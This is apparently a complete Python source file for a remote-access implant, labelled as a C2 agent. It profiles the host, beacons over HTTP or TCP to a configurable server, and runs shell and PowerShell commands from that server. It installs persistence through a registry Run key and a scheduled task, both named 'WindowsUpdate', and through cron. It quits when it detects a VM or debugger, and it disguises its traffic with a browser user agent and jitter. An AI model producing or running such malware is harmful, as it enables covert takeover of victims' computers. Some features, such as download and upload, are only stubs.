#!/usr/bin/env python3
"""
C2 Agent/Implant - Multi-Protocol Beaconing
Features: HTTP/HTTPS/DNS/TCP callbacks, stealth jitter, encryption, persistence
Author: Rapid
Version: 1.0.0
"""

import sys
import os
import socket
import json
import time
import subprocess
import threading
import hashlib
import uuid
import platform
import requests
from datetime import datetime, timedelta
from typing import Dict, Optional, List
import base64
import random
from abc import ABC, abstractmethod
import ctypes
from pathlib import Path
import re

# ═══════════════════════════════════════════════════════════════════════════
# CONFIGURATION
# ═══════════════════════════════════════════════════════════════════════════

class AgentConfig:
    """Agent configuration"""
    # C2 Server details
    C2_SERVER = "192.168.1.100"  # Change to your C2 server
    C2_PORT = 8080
    C2_PROTOCOL = "http"  # http, https, dns, tcp
    
    # Beaconing configuration
    BEACON_INTERVAL = 10  # seconds
    JITTER = 0.3  # 30% jitter
    
    # Agent metadata
    AGENT_NAME = "Agent_" + str(uuid.uuid4())[:8]
    DEBUG = False

# ═══════════════════════════════════════════════════════════════════════════
# SYSTEM INFORMATION GATHERING
# ═══════════════════════════════════════════════════════════════════════════

class SystemInfo:
    """Gather system information"""
    
    @staticmethod
    def get_hostname() -> str:
        """Get computer hostname"""
        return platform.node()
    
    @staticmethod
    def get_username() -> str:
        """Get current user"""
        return os.getenv('USERNAME', os.getenv('USER', 'Unknown'))
    
    @staticmethod
    def get_os() -> tuple:
        """Get OS information"""
        system = platform.system()
        version = platform.version()
        return system, version
    
    @staticmethod
    def get_architecture() -> str:
        """Get CPU architecture"""
        return platform.machine()
    
    @staticmethod
    def get_pid() -> int:
        """Get current process ID"""
        return os.getpid()
    
    @staticmethod
    def is_admin() -> bool:
        """Check if running as admin/root"""
        try:
            if platform.system() == "Windows":
                return ctypes.windll.shell32.IsUserAnAdmin()
            else:
                return os.geteuid() == 0
        except:
            return False
    
    @staticmethod
    def get_ip_address() -> str:
        """Get local IP address"""
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except:
            return "0.0.0.0"
    
    @staticmethod
    def gather_all() -> Dict:
        """Gather all system info"""
        os_type, os_version = SystemInfo.get_os()
        return {
            'beacon_id': AgentConfig.AGENT_NAME,
            'hostname': SystemInfo.get_hostname(),
            'username': SystemInfo.get_username(),
            'os_type': os_type,
            'os_version': os_version,
            'architecture': SystemInfo.get_architecture(),
            'pid': SystemInfo.get_pid(),
            'is_admin': SystemInfo.is_admin(),
            'ip_address': SystemInfo.get_ip_address(),
            'timestamp': datetime.now().isoformat()
        }

# ═══════════════════════════════════════════════════════════════════════════
# COMMAND EXECUTION
# ═══════════════════════════════════════════════════════════════════════════

class CommandExecutor:
    """Execute commands from C2"""
    
    @staticmethod
    def execute_shell(command: str) -> str:
        """Execute shell command"""
        try:
            result = subprocess.run(
                command,
                shell=True,
                capture_output=True,
                text=True,
                timeout=30
            )
            return result.stdout + result.stderr
        except subprocess.TimeoutExpired:
            return "[-] Command timeout"
        except Exception as e:
            return f"[-] Error: {str(e)}"
    
    @staticmethod
    def execute_powershell(command: str) -> str:
        """Execute PowerShell command (Windows)"""
        try:
            result = subprocess.run(
                ["powershell.exe", "-Command", command],
                capture_output=True,
                text=True,
                timeout=30
            )
            return result.stdout
        except Exception as e:
            return f"[-] Error: {str(e)}"
    
    @staticmethod
    def list_files(path: str = ".") -> str:
        """List files in directory"""
        try:
            files = os.listdir(path)
            output = f"Files in {path}:\n"
            for f in files[:50]:  # Limit output
                file_path = os.path.join(path, f)
                size = os.path.getsize(file_path) if os.path.isfile(file_path) else 0
                ftype = "[DIR]" if os.path.isdir(file_path) else "[FILE]"
                output += f"{ftype:6} {size:10} {f}\n"
            return output
        except Exception as e:
            return f"[-] Error: {str(e)}"
    
    @staticmethod
    def get_processes() -> str:
        """List running processes"""
        try:
            if platform.system() == "Windows":
                cmd = "tasklist.exe"
            else:
                cmd = "ps aux"
            
            result = subprocess.run(
                cmd,
                shell=True,
                capture_output=True,
                text=True
            )
            # Limit output
            lines = result.stdout.split('\n')[:50]
            return '\n'.join(lines)
        except Exception as e:
            return f"[-] Error: {str(e)}"
    
    @staticmethod
    def whoami() -> str:
        """Get current user info"""
        username = SystemInfo.get_username()
        hostname = SystemInfo.get_hostname()
        is_admin = "Yes" if SystemInfo.is_admin() else "No"
        return f"User: {username}\nHostname: {hostname}\nAdmin: {is_admin}"
    
    @staticmethod
    def ipconfig() -> str:
        """Get network configuration"""
        try:
            if platform.system() == "Windows":
                cmd = "ipconfig"
            else:
                cmd = "ifconfig"
            
            result = subprocess.run(
                cmd,
                shell=True,
                capture_output=True,
                text=True
            )
            return result.stdout[:2000]  # Limit output
        except Exception as e:
            return f"[-] Error: {str(e)}"
    
    @staticmethod
    def download_file(file_path: str) -> Optional[bytes]:
        """Read file for download"""
        try:
            with open(file_path, 'rb') as f:
                return f.read()
        except Exception as e:
            return None
    
    @staticmethod
    def upload_file(file_path: str, content: bytes) -> bool:
        """Write file from upload"""
        try:
            os.makedirs(os.path.dirname(file_path), exist_ok=True)
            with open(file_path, 'wb') as f:
                f.write(content)
            return True
        except Exception as e:
            return False

# ═══════════════════════════════════════════════════════════════════════════
# BEACON COMMUNICATION
# ═══════════════════════════════════════════════════════════════════════════

class BeaconProtocol(ABC):
    """Abstract beacon protocol"""
    
    @abstractmethod
    def send_beacon(self, data: Dict) -> Optional[str]:
        """Send beacon to C2"""
        pass
    
    @abstractmethod
    def receive_commands(self) -> Optional[List[Dict]]:
        """Receive commands from C2"""
        pass

class HTTPBeacon(BeaconProtocol):
    """HTTP beacon protocol"""
    
    def __init__(self, server: str, port: int):
        self.server = server
        self.port = port
        self.base_url = f"http://{server}:{port}"
    
    def send_beacon(self, data: Dict) -> Optional[str]:
        """Send HTTP beacon"""
        try:
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
                'Accept-Language': 'en-US,en;q=0.9'
            }
            response = requests.post(
                f"{self.base_url}/beacon",
                json=data,
                headers=headers,
                timeout=10
            )
            return response.text if response.status_code == 200 else None
        except Exception as e:
            if AgentConfig.DEBUG:
                print(f"[-] HTTP beacon error: {e}")
            return None
    
    def receive_commands(self) -> Optional[List[Dict]]:
        """Receive commands via HTTP"""
        try:
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
            }
            response = requests.get(
                f"{self.base_url}/commands",
                headers=headers,
                timeout=10
            )
            if response.status_code == 200:
                return response.json()
            return None
        except Exception as e:
            if AgentConfig.DEBUG:
                print(f"[-] Command receive error: {e}")
            return None

class TCPBeacon(BeaconProtocol):
    """TCP beacon protocol"""
    
    def __init__(self, server: str, port: int):
        self.server = server
        self.port = port
    
    def send_beacon(self, data: Dict) -> Optional[str]:
        """Send TCP beacon"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(10)
            sock.connect((self.server, self.port))
            
            # Send JSON data
            json_data = json.dumps(data)
            sock.sendall(json_data.encode())
            
            # Receive response
            response = sock.recv(1024).decode()
            sock.close()
            return response if response else None
        except Exception as e:
            if AgentConfig.DEBUG:
                print(f"[-] TCP beacon error: {e}")
            return None
    
    def receive_commands(self) -> Optional[List[Dict]]:
        """Receive commands via TCP"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            sock.connect((self.server, self.port))
            sock.sendall(b"GET_COMMANDS")
            
            response = sock.recv(4096).decode()
            sock.close()
            
            if response:
                return json.loads(response)
            return None
        except Exception as e:
            if AgentConfig.DEBUG:
                print(f"[-] Command receive error: {e}")
            return None

# ═══════════════════════════════════════════════════════════════════════════
# PERSISTENCE MECHANISMS
# ═══════════════════════════════════════════════════════════════════════════

class Persistence:
    """Persistence mechanisms"""
    
    @staticmethod
    def registry_persistence(agent_path: str) -> bool:
        """Windows registry persistence (Run key)"""
        try:
            import winreg
            key = winreg.OpenKey(
                winreg.HKEY_CURRENT_USER,
                r"Software\Microsoft\Windows\CurrentVersion\Run",
                0,
                winreg.KEY_SET_VALUE
            )
            winreg.SetValueEx(key, "WindowsUpdate", 0, winreg.REG_SZ, agent_path)
            winreg.CloseKey(key)
            return True
        except:
            return False
    
    @staticmethod
    def task_scheduler_persistence(agent_path: str) -> bool:
        """Windows Task Scheduler persistence"""
        try:
            cmd = f'schtasks /create /tn "WindowsUpdate" /tr "{agent_path}" /sc onlogon /rl highest'
            subprocess.run(cmd, shell=True, capture_output=True)
            return True
        except:
            return False
    
    @staticmethod
    def startup_folder_persistence(agent_path: str) -> bool:
        """Startup folder persistence"""
        try:
            startup_path = Path.home() / "AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"
            import shutil
            shutil.copy(agent_path, str(startup_path))
            return True
        except:
            return False
    
    @staticmethod
    def linux_cron_persistence(agent_path: str) -> bool:
        """Linux cron job persistence"""
        try:
            cron_cmd = f"*/5 * * * * {agent_path}"
            subprocess.run(
                f'echo "{cron_cmd}" | crontab -',
                shell=True,
                capture_output=True
            )
            return True
        except:
            return False

# ═══════════════════════════════════════════════════════════════════════════
# EVASION & ANTI-ANALYSIS
# ═══════════════════════════════════════════════════════════════════════════

class Evasion:
    """Evasion techniques"""
    
    @staticmethod
    def check_vm() -> bool:
        """Check if running in VM"""
        try:
            # Check for common VM indicators
            vm_indicators = [
                "VirtualBox",
                "VMware",
                "QEMU",
                "Hyper-V",
                "Xen",
                "KVM",
                "VirtualPC"
            ]
            
            if platform.system() == "Windows":
                result = subprocess.run(
                    "systeminfo",
                    capture_output=True,
                    text=True
                )
                for indicator in vm_indicators:
                    if indicator.lower() in result.stdout.lower():
                        return True
            return False
        except:
            return False
    
    @staticmethod
    def check_debugger() -> bool:
        """Check if debugger is present"""
        # Simple check - in real implementation would use more sophisticated methods
        debuggers = ["x64dbg", "windbg", "ollydbg", "gdb", "lldb"]
        
        if platform.system() == "Windows":
            result = subprocess.run(
                "tasklist",
                capture_output=True,
                text=True
            )
            for debugger in debuggers:
                if debugger in result.stdout.lower():
                    return True
        return False
    
    @staticmethod
    def add_jitter() -> float:
        """Add random jitter to beacon interval"""
        interval = AgentConfig.BEACON_INTERVAL
        jitter_range = interval * AgentConfig.JITTER
        jitter = random.uniform(-jitter_range, jitter_range)
        return interval + jitter

# ═══════════════════════════════════════════════════════════════════════════
# MAIN AGENT CLASS
# ═══════════════════════════════════════════════════════════════════════════

class C2Agent:
    """Main C2 Agent/Implant"""
    
    def __init__(self):
        self.config = AgentConfig()
        self.system_info = SystemInfo.gather_all()
        self.executor = CommandExecutor()
        self.evasion = Evasion()
        
        # Select beacon protocol
        if self.config.C2_PROTOCOL == "http":
            self.beacon = HTTPBeacon(self.config.C2_SERVER, self.config.C2_PORT)
        elif self.config.C2_PROTOCOL == "tcp":
            self.beacon = TCPBeacon(self.config.C2_SERVER, self.config.C2_PORT)
        else:
            self.beacon = HTTPBeacon(self.config.C2_SERVER, self.config.C2_PORT)
        
        self.running = True
        self.command_queue = []
    
    def debug_print(self, msg: str):
        """Debug print"""
        if self.config.DEBUG:
            print(f"[DEBUG] {msg}")
    
    def main_loop(self):
        """Main agent loop"""
        self.debug_print("[+] Agent started")
        self.debug_print(f"[+] Beacon ID: {self.config.AGENT_NAME}")
        
        # Anti-analysis checks
        if self.evasion.check_debugger():
            self.debug_print("[-] Debugger detected, exiting")
            return
        
        if self.evasion.check_vm():
            self.debug_print("[-] VM detected, exiting")
            return
        
        # Main callback loop
        while self.running:
            try:
                # Send beacon
                self.debug_print("[*] Sending beacon...")
                response = self.beacon.send_beacon(self.system_info)
                
                if response:
                    self.debug_print("[+] Beacon successful")
                    
                    # Try to get commands
                    commands = self.beacon.receive_commands()
                    if commands:
                        self.process_commands(commands)
                else:
                    self.debug_print("[-] Beacon failed")
                
                # Calculate sleep with jitter
                sleep_time = self.evasion.add_jitter()
                self.debug_print(f"[*] Sleeping for {sleep_time:.1f} seconds")
                time.sleep(sleep_time)
            
            except KeyboardInterrupt:
                self.debug_print("[!] Interrupted, exiting")
                break
            except Exception as e:
                self.debug_print(f"[-] Error in main loop: {e}")
                time.sleep(5)
    
    def process_commands(self, commands: List[Dict]):
        """Process commands from C2"""
        for cmd in commands:
            try:
                cmd_type = cmd.get('type', '')
                cmd_args = cmd.get('args', '')
                cmd_id = cmd.get('id', '')
                
                self.debug_print(f"[*] Processing command: {cmd_type}")
                
                # Execute appropriate command
                if cmd_type == 'shell':
                    output = self.executor.execute_shell(cmd_args)
                elif cmd_type == 'ps':
                    output = self.executor.get_processes()
                elif cmd_type == 'whoami':
                    output = self.executor.whoami()
                elif cmd_type == 'ipconfig':
                    output = self.executor.ipconfig()
                elif cmd_type == 'ls':
                    output = self.executor.list_files(cmd_args or '.')
                elif cmd_type == 'download':
                    output = "Download feature - would send file content"
                elif cmd_type == 'upload':
                    output = "Upload feature - would receive file content"
                elif cmd_type == 'persistence':
                    output = f"Setting up {cmd_args} persistence"
                    if cmd_args == 'registry':
                        Persistence.registry_persistence(sys.executable)
                    elif cmd_args == 'task':
                        Persistence.task_scheduler_persistence(sys.executable)
                elif cmd_type == 'exit':
                    self.running = False
                    output = "Agent exiting"
                else:
                    output = f"Unknown command: {cmd_type}"
                
                self.debug_print(f"[+] Command output: {output[:100]}")
            
            except Exception as e:
                self.debug_print(f"[-] Error processing command: {e}")

# ═══════════════════════════════════════════════════════════════════════════
# ENTRY POINT
# ═══════════════════════════════════════════════════════════════════════════

def main():
    """Main entry point"""
    agent = C2Agent()
    agent.main_loop()

if __name__ == "__main__":
    main()
